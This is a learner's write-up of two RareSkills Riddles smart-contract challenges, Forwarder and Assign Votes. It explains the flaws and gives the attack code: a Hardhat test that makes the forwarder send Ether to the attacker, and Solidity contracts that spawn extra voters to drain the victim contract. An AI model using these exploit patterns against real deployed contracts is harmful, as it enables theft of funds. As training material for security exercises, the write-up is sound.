## Day 13: Business logic errors (and ABI encoding Prerequisite)

### RareSkills Riddles: Forwarder

The objective of this attack is to get the attacker's wallet to be near 1 Eth in value.  This appears to be a test of using call() and delegatecall().  The Wallet's sendEther function expects to be called by the Forwarder contract.  

```Java
    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success, ) = destination.call{value: amount}("");
        require(success, "failed");
    }
```

The Hardhat test code to make this call is given below.  The hardest part was encoding in JavaScript.  

```Javascript
    it("conduct your attack here", async function () {
      // forwarder contract needs to call functionCall(walletContract.address, bytes)
      // set up abi.encodeWithSignature in JS
      let ABI = ["constructor(address _forwarder)",
        "function sendEther(address destination, uint256 amount)",];
      let iface = new ethers.utils.Interface(ABI);
      let encodedShit = iface.encodeFunctionData("sendEther", [attackerWallet.address, ethers.utils.parseEther("1")]);

      await forwarderContract.connect(attackerWallet).functionCall(walletContract.address, encodedShit);
    });
```

The code above simply has the forwarderContract forward the ```sendEther()``` call to the Wall contract.  


### RareSkills Riddles: Assign Votes

The objective here is to drain the victimContract in one transaction.  The contract can create proposals and addresses can vote on these proposals if they have been assigned.  Each address can vote 

Each proposal has a value, a target address and data that will be called if the number of votes is over 9.  Any address can vote, but in order to vote the address must be assigned a vote.  Here is the code for ```assign()``` and ```removeAssignment()```.  

```Java
    function removeAssignment(address _voter) public {
        require(!alreadyVoted[_voter], "already voted");
        require(assignedBy[_voter] != address(0), "not assigned");

        assignedBy[_voter] = address(0);
        amountAssigned[msg.sender] += 1;
    }

    function assign(address _voter) public {
        require(amountAssigned[msg.sender] >= -5, "you ran out of assignments");
        assignedBy[_voter] = msg.sender;
        amountAssigned[msg.sender] -= 1;
    }
```

One thing to note is that there are no special permissions for assigning votes.  Any address can assign any five addresses as voters.  We could create five or ten contracts and have them vote.  Code to do this is given below.  The code is a contract (```Attacker```) which creates two ```Spawner``` contracts which spawn five ```Voter``` contracts.   The Attacker contract first creates a proposal which is to receive 1 Ether, and finally calls ```execute()``` on that proposal after it has been voted for.  


```Java
contract Attacker {
    AssignVotes immutable victim;

    constructor(address _victimAdd, uint _proposalNumber) {
        victim = AssignVotes(_victimAdd);

        // create proposal         address target, bytes calldata data, uint256 value
        victim.createProposal(address(this), "", 1 ether);
        // create two spawners 
        Spawner spawner0 = new Spawner(_victimAdd, _proposalNumber);
        Spawner spawner1 = new Spawner(_victimAdd, _proposalNumber);

        victim.execute(_proposalNumber);
    }

    receive() external payable { 
    }
}

// spawns five Voter contracts which vote for our proposal 
contract Spawner {
    constructor (address _victimAdd, uint256 _proposalNumber) {
        AssignVotes victim = AssignVotes(_victimAdd);

        // create 5 voter contracts
        for (uint8 i; i<6; i++) {
            // create voter contract
            Voter voterI = new Voter(_victimAdd);
            // approve voterI to vote
            victim.assign(address(voterI));
            // call voter.vote()
            voterI.vote(_proposalNumber);
        }
    }
}

contract Voter {
    AssignVotes immutable victim;

    constructor (address _victimAdd) {
        victim = AssignVotes(_victimAdd);
    }

    function vote(uint256 proposalNum) external {
        victim.vote(proposalNum);
    }
}
```